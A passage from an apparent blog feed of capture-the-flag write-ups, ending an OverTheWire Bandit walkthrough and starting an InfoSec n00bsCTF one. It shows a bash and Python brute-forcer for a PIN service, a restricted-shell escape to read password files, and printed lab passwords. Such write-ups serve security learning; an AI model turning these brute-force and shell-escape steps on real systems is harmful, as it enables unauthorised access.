&lt;p&gt;Make it executable, copy it to the right directory and then harvest the key&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit23@melinda:/tmp$ chmod +x t.sh
bandit23@melinda:/tmp$ cp t.sh /var/spool/bandit24/
bandit23@melinda:/tmp$ cat /tmp/unl.pass
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;h1 id=&#34;level-24-25:0e66a8a07761fc75a6c8722719cf3240&#34;&gt;Level 24 -&amp;gt; 25&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://overthewire.org/wargames/bandit/bandit25.html&#34;&gt;Level 24&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Here we need to bruteforce our way to the password. No point entering our
tries by hand, so let&amp;rsquo;s leverage the power of bash. First create a loop
to print the values, so we can be sure the input to the netcat command is
going to be right&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit24@melinda:~$ &lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt; i in &lt;span style=&#34;color: #66d9ef&#34;&gt;$(&lt;/span&gt;seq -f &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;%04g&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt; 9999&lt;span style=&#34;color: #66d9ef&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;do&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ &amp;#39;${&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;done&lt;/span&gt;
.
.
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9856
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9857
.
.
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;seems to ne what we want. Let&amp;rsquo;s actually pass it onto the command. Because each
iteration will take a while, we have plenty of time to stop it when it finds the
right answer&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit24@melinda:~$ &lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt; i in &lt;span style=&#34;color: #66d9ef&#34;&gt;$(&lt;/span&gt;seq -f &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;%04g&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt; 9999&lt;span style=&#34;color: #66d9ef&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;do&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ &amp;#39;${&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; nc localhost 30002&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;done&lt;/span&gt; 
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;But who wants to sit there watching a screen? A quick Python script and we can
leave it running until it finds the right PIN.
Sometimes you just have to be patient.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;socket&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;netcat&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(hostname,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;port,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;content):&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;s&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;socket&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;socket(socket&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;AF_INET,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;socket&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;SOCK_STREAM)&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;s&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;connect((hostname,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;port))&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;s&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;sendall(content)&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;s&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;shutdown(socket&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;SHUT_WR)&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;data&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;s&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;recv(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1024&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;
        &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;data&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt;
            &lt;span style=&#34;color: #66d9ef&#34;&gt;break&lt;/span&gt;
        &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;I am the pincode&amp;#39;&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;repr(data):&lt;/span&gt;
            &lt;span style=&#34;color: #66d9ef&#34;&gt;continue&lt;/span&gt;

        &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;Wrong&amp;#39;&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;repr(data):&lt;/span&gt;
            &lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;no:&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;content&lt;/span&gt;
            &lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;
        &lt;span style=&#34;color: #66d9ef&#34;&gt;else&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt;
            &lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;repr(data)&lt;/span&gt;
            &lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;content&lt;/span&gt;
            &lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;

    &lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Connection closed.&amp;quot;&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;s&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;close()&lt;/span&gt;

&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;sys&lt;/span&gt;

&lt;span style=&#34;color: #f8f8f2&#34;&gt;passw&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;count&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;
&lt;span style=&#34;color: #66d9ef&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;):&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;trypass&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;%s %04d&amp;#39;&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;(passw,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;count)&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;(netcat(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;localhost&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;30002&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;trypass)):&lt;/span&gt;
        &lt;span style=&#34;color: #66d9ef&#34;&gt;break&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;count&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Some time passes&amp;hellip;..&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;no: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 5668
&amp;#39;Correct!\nThe password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG\n\nExiting.\n&amp;#39;
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 5669
bandit24@melinda:~$ 
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;h1 id=&#34;level-25-26:0e66a8a07761fc75a6c8722719cf3240&#34;&gt;Level 25 -&amp;gt; 26&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://overthewire.org/wargames/bandit/bandit26.html&#34;&gt;Level 25&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Ok, so first we need to see what happens when we log in as Bandit26&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit25@melinda:~$ ssh -i bandit26.sshkey bandit26@localhost
  _                     _ _ _   ___   __  
 | |                   | (_) | |__ \ / /  
 | |__   __ _ _ __   __| |_| |_   ) / /_  
 | &amp;#39;_ \ / _` | &amp;#39;_ \ / _` | | __| / / &amp;#39;_ \ 
 | |_) | (_| | | | | (_| | | |_ / /| (_) |
 |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/ 
Connection to localhost closed.
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Hrm&amp;hellip; ok, let&amp;rsquo;s check the shell bandit26 uses:&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;bandit25@melinda:/home/bandit25$ cat /etc/passwd &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; grep bandit26
bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
bandit25@melinda:/home/bandit25$ cat /usr/bin/showtext
#!/bin/sh

more ~/text.txt
exit 0
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Interesting. So we need to break out of &lt;code&gt;more&lt;/code&gt; somehow. With &lt;code&gt;more&lt;/code&gt; we
can go into interactive mode if we can figure out how to pause it.
We can do that by limiting how much it can output to the screen.
The ASCII art above is about 8 lines, let&amp;rsquo;s resize the terminal to 5 lines
or something, and when it pauses, hit &amp;lsquo;v&amp;rsquo; to open an editor.&lt;/p&gt;

&lt;p&gt;Once in the editor simply open &lt;code&gt;/etc/bandit_pass/bandit26&lt;/code&gt; and the password
is: &lt;code&gt;5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;And that&amp;rsquo;s the last password in the list, and thus the end of the game.&lt;/p&gt;

&lt;p&gt;It was good fun and had a nice incrementing level of difficulty&lt;/p&gt;

&lt;p&gt;Hope you had as much fun as me playing this. Next time we&amp;rsquo;ll tackle &lt;code&gt;Leviathan&lt;/code&gt;.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Solving Infosec n00bsCTF</title>
      <link>http://unlogic.co.uk/2015/03/11/infosec-n00bsctf/</link>
      <pubDate>Wed, 11 Mar 2015 00:00:00 +0000</pubDate>
      
      <guid>http://unlogic.co.uk/2015/03/11/infosec-n00bsctf/</guid>
      <description>

&lt;p&gt;The InfoSec Institue is running a &lt;a href=&#34;http://ctf.infosecinstitute.com/index.php&#34;&gt;n00bsCTF&lt;/a&gt;,
and I can&amp;rsquo;t resist a CTF really. Plus this will be a nice warmup for Hackyeaster 2015.
So let&amp;rsquo;s jump on it and get some flags&amp;hellip;&lt;/p&gt;

&lt;p&gt;I haven&amp;rsquo;t managed to get all of them, but I will be updating this post when
I manage to solve some of the others.&lt;/p&gt;

&lt;h2 id=&#34;level-01:aad69195db02279e47989643f4843312&#34;&gt;Level 01&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/levelone.php&#34;&gt;http://ctf.infosecinstitute.com/levelone.php&lt;/a&gt;&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/ebnLRwp.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;May the source be with you, eh? Sounds to me like someone wants us to look at the
page source. Right click, select &lt;code&gt;view page source&lt;/code&gt; and&amp;hellip;&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;&amp;lt;!-- infosec_flagis_welcome --&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;&amp;lt;html&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;lang=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;en&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;&amp;gt;&lt;/span&gt;
  &lt;span style=&#34;color: #f92672&#34;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;And there it is, right at the top.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;infosec_flagis_welcome
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;level-02:aad69195db02279e47989643f4843312&#34;&gt;Level 02&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/leveltwo.php&#34;&gt;http://ctf.infosecinstitute.com/leveltwo.php&lt;/a&gt;&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/TVGZFKU.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;A broken image you say? Let&amp;rsquo;s download it and have a look. We notice it&amp;rsquo;s very small,
only 45 bytes. So let&amp;rsquo;s open it in a hex editor and examine its contents. I opened
it in vim (to use it as a hex editor enter &lt;code&gt;:!xxd&lt;/code&gt;),
and was instantly greeted with this string. Didn&amp;rsquo;t even have to convert it to hex.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;aW5mb3NlY19mbGFnaXNfd2VhcmVqdXN0c3RhcnRpbmc=
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Base64 encoded text. Let&amp;rsquo;s run it through a decoder and see what we get&amp;hellip;.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;infosec_flagis_wearejuststarting
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Level02&amp;rsquo;s flag done.&lt;/p&gt;

&lt;h2 id=&#34;level-03:aad69195db02279e47989643f4843312&#34;&gt;Level 03&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/levelthree.php&#34;&gt;http://ctf.infosecinstitute.com/levelthree.php&lt;/a&gt;&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/lL8OkTO.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;We are presented with a QR code. So I grabbed my phone, scanned it, and was presented
with a series of dots and dashes. Morse code no doubt. Being lazy I didn&amp;rsquo;t want to type
it into a decoder manually,
so I used &lt;a href=&#34;http://zxing.org/w/decode.jspx&#34;&gt;this tool&lt;/a&gt; to decode the QR code
and then copy/pasted the output into a &lt;a href=&#34;http://www.onlineconversion.com/morse_code.htm&#34;&gt;morse code translator&lt;/a&gt;
and ended up with:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;INFOSECFLAGISMORSING
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;level-04:aad69195db02279e47989643f4843312&#34;&gt;Level 04&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/levelfour.php&#34;&gt;http://ctf.infosecinstitute.com/levelfour.php&lt;/a&gt;&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/yFiSrus.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;A picture and a tidbit of information. Hrmm&amp;hellip; Ok, not much to go with here. Mousing
over the image pops up a dialog. Investigating that didn&amp;rsquo;t lead me anywhere. Time
to get the thinking hats on and think about what info we have here that might be
relevant. Because everything we need to solve this level is somewhere here.
Of course the biggest clue is the picture: Cookie Monster. Right, let&amp;rsquo;s check the cookie
cache. Only one cookie by infosecinstitute. It&amp;rsquo;s garbage! Or is it perhaps just a
caesar cipher? Each letter is shifted by a certain amount, and we need to figure out
that amount. Due to the number of characters and _ in the string, it looks like it.&lt;/p&gt;

&lt;p&gt;Knowing the format of previous flags we can figure out how much to shift by.&lt;/p&gt;

&lt;p&gt;So &lt;code&gt;vasbfrp_syntvf_jrybirpbbxvrf&lt;/code&gt; should be &lt;code&gt;infosec_flag_xxxxxxx&lt;/code&gt;. Knowing this
we can work out the shift. Simple write out the alphabet once and
then, write the letters we know below.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;abcdefghijklmnopqrstuvwxyz
n                 f   i
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;That&amp;rsquo;s enough for us to fill in the rest of the alphabet.
Then transpose and solve the final part to get:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;infosec_flag_welovecookies
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Flag has been nommed.&lt;/p&gt;

&lt;h2 id=&#34;level-05:aad69195db02279e47989643f4843312&#34;&gt;Level 05&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/levelfive.php&#34;&gt;http://ctf.infosecinstitute.com/levelfive.php&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;A pesky popup saying I&amp;rsquo;m a hacker? What an accusation. Well, let&amp;rsquo;s top it from
popping up and get ourselves a script blocker to see what else there might be.
Once done, we examine the source and see it&amp;rsquo;s loading an image too.&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #f92672&#34;&gt;&amp;lt;img&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;src=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;img/aliens.jpg&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;/&amp;gt;&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;&amp;lt;br&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;/&amp;gt;&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;&amp;lt;br&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;



&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/JwFtmSw.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Let&amp;rsquo;s load up that image, or even better, let&amp;rsquo;s just browse to &lt;code&gt;http://ctf.infosecinstitute.com/img/&lt;/code&gt;
(Since writing directory listing has been disabled for this path).
Nothing particularily odd about the image. Let&amp;rsquo;s try seeing if there&amp;rsquo;s anything hidden in
it by way of steganography. I loaded up the image into &lt;a href=&#34;http://www.futureboy.us/stegano/decinput.html&#34;&gt;this site&lt;/a&gt;
and sure enough, selecting a type of &lt;code&gt;text/plain&lt;/code&gt; we get a stream of 1s and 0s. Binary data.
Let&amp;rsquo;s try to convert that to a string and see what, if anything, it says. Using any
binary to text decoder on the internet, we are given the flag:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;infosec_flagis_stegaliens
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Gotcha&lt;/p&gt;

&lt;h2 id=&#34;level-06:aad69195db02279e47989643f4843312&#34;&gt;Level 06&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/levelsix.php&#34;&gt;http://ctf.infosecinstitute.com/levelsix.php&lt;/a&gt;&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/w81ZV0N.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;At first I was a bit lost, but when you stare at a lot of data, it&amp;rsquo;s easy to be overwhelmed.
Especially when you don&amp;rsquo;t know really what you are looking for. I decided to give it another go
and have located the flag. It&amp;rsquo;s actually in the very first packet. The hex string for &lt;em&gt;infosec_flag&lt;/em&gt;
is starting to look very familiar now. It appears as the data of the first packet:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/aO8ojXG.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Enter the string with &lt;code&gt;696e66...&lt;/code&gt; into a hex to string converter and you get&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;infosec_flagis_sniffed
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Sniffed right out.&lt;/p&gt;

&lt;h2 id=&#34;level-07:aad69195db02279e47989643f4843312&#34;&gt;Level 07&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/404.php&#34;&gt;http://ctf.infosecinstitute.com/404.php&lt;/a&gt;&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/PZu5CIK.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;We get an error saying &lt;em&gt;f00 not found&lt;/em&gt; and the URL reads 404.php. Going by the other URLs
I would assume we actually need &lt;code&gt;levelseven.php&lt;/code&gt;, so let&amp;rsquo;s enter that and see what we get.
It seems to return an empty page. That&amp;rsquo;s not much use, but it&amp;rsquo;s better than a real
404. Because there&amp;rsquo;s no error and no content, we must be getting back a 200 status (all OK).
Perhaps there&amp;rsquo;s something else to look at too?&lt;/p&gt;

&lt;p&gt;In this case let&amp;rsquo;s examine what&amp;rsquo;s going back and forth between us and the server.
You can either fire up a proxy like &lt;a href=&#34;https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project&#34;&gt;ZAP&lt;/a&gt;
or use a request inspection plugin for Firefox like &lt;a href=&#34;https://addons.mozilla.org/en-US/firefox/addon/httprequester/&#34;&gt;httpRequester&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;So let&amp;rsquo;s send off a GET request for &lt;code&gt;levelseven.php&lt;/code&gt; and see what we get back.&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;HTTP/1.0 200 aW5mb3NlY19mbGFnaXNfeW91Zm91bmRpdA==
Date: Thu, 12 Mar 2015 09:26:48 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.6
Content-Length: 0
Connection: close
Content-Type: text/html
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Heh, very nice. We have a 200 response with, what is clearly a base64 encoded string.
Copypasta that into a decoder and let&amp;rsquo;s see what we get:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;infosec_flagis_youfoundit
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Yes, I did find it.&lt;/p&gt;

&lt;h2 id=&#34;level-08:aad69195db02279e47989643f4843312&#34;&gt;Level 08&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/leveleight.php&#34;&gt;http://ctf.infosecinstitute.com/leveleight.php&lt;/a&gt;&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/OSKPz0g.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Ok, let&amp;rsquo;s download &lt;code&gt;app.exe&lt;/code&gt; and give this a go. It&amp;rsquo;s a wrapper around &lt;code&gt;netstat&lt;/code&gt; that
just shows you what your current connections are. It takes no arguments, so there&amp;rsquo;s
not anyway to attack this thing with overflows. And this being a n00bs level CTF, it&amp;rsquo;s
unlikely we&amp;rsquo;ll be thrown this kind of exploit development.
So the other thing we can do is check its strings.&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;strings app.exe
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Sure enough, there&amp;rsquo;s &lt;code&gt;infosec_flagis_0x1a&lt;/code&gt;. At first I was reluctant to go with this, as
it&amp;rsquo;s a bit too simple, so I looked a bit further. I dumped the source with &lt;code&gt;objdump&lt;/code&gt;&lt;/p&gt;

